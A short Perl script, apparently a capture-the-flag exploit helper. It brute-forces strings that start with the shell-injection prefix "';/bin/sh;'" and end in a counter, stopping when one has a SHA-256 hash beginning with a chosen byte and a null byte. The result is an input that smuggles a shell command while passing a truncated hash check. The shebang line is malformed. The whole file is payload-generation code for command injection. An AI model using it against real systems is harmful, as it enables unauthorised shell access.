#!/usr/bin.perl

use strict;
use warnings;

use Digest::SHA;

my $prefix = "';/bin/sh;'";

my $target = sprintf("%c\x00", @ARGV > 0 ? int($ARGV[0]) : 1);

for (my $i = 1; ; $i++) {
	my $test = $prefix;
	for (my $j = $i; $j > 0; $j = int($j / 94)) {
		$test .= chr($j % 94 + 0x21);
	}
	my $sha = Digest::SHA::sha256($test);
	if (substr($sha, 0, 2) eq $target) {
		print "found! i = $i\ntest=$test\n";
		exit;
	}
	if ($i % 0x1000 == 0) {
		print STDERR "searching... $i\n";
	}
}
